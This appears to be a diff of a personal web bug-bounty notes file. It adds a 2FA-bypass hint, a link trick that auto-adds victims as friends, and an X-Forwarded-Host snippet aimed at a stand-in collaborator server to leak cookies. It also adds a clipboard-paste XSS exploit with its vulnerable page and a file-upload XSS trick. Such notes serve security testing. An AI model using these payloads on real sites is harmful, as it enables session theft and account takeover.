@@ -81,7 +81,8 @@ If you are not asked to enter a 2FA code, You can report.
 
 -- parameter guessing adding password to JSON body in request and all sorts I.e email to bypass 2fa
 
-
+-- if the webapp has an upload image functionality/ link to for image insertion, be sure that the malicious link hass the root domain,
+   or a invitation code that when viewed it automatically add the victim as friend
 
 
 
@@ -111,7 +112,7 @@ a lot of programming spaces to cover let begin
 // 
 ################## XSS #######################3
 .. the svg image upload style
-.. the following svg payload....           
+the following svg payload....           
 
             <?xml version="1.0" standalone="no"?>
             <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
@@ -125,13 +126,49 @@ a lot of programming spaces to cover let begin
 .. if the page contains a parameter i.e param=  , try breaking the application, insert an emoji,
 if the application breaks insert a script tag afterwards i.e param='emoji'<script>alert()</script>
 
-.. 
+.. changing the x-forwarded-host to burp/zap oastify server it can confuse a load balancer to forward cookie
+to the attacker controlled domain, if an xxs javascript could be used to steal cookies
 
+      function httpGet(Url)
+      {
+       var xmlHttp = new XMLHttpRequest(); // Create a new XMLHttpRequest object
+       xmlHttp.open( “GET”, Url, false ); // Initialize the request 
+       **xmlHttp.setRequestHeader(“X-Forwarded-Host”, “https://collaborator-server.com"); // Set a custom HTTP header (X-Forwarded-Host) pointing to collaborator server**
+       xmlHttp.send( null ); // Send the request
+       return xmlHttp.responseText; 
+      }
+      httpGet(“https://vulnerableapp.host/"); // Run payload
 
+.. copy and paste xss, the following snippet is vulnerable to xss
+                                                                    <input placeholder="Paste here" id="pasted"/>
+                                                                    <script>
+                                                                    document.addEventListener('paste', event => {
+                                                                        const data = event.clipboardData.getData('text/html');
+                                                                        pasted.innerHTML = data;
+                                                                    });
+                                                                    </script>
 
+it can be exploited with the following 
 
+                                                              <button onclick="copy()">Click</button>
+                                                              <script>
+                                                                  document.addEventListener('copy', event => {
+                                                                      event.preventDefault();
+                                                                      event.clipboardData.setData('text/html', '<img src onerror=alert(1)>');
+                                                                      alert('Please paste the copied contents into the vulnerable page');
+                                                                  });
+                                                                  function copy() {
+                                                                      document.execCommand('copy');
+                                                                  }
+                                                              </script>
 
+.. xss via file upload, if the functionality does not allow uploading of other files excetpt that from .images extensions
+   try uploading without file just extension, i.e .mp3 and change the content to html with script tag, 
+   upload a mask.jpg so you can navigate to the .mp3 path
 
+.. test every parameters in a webapp for xss i.e param=1&param=1&param=3
+
+..
 
 
 
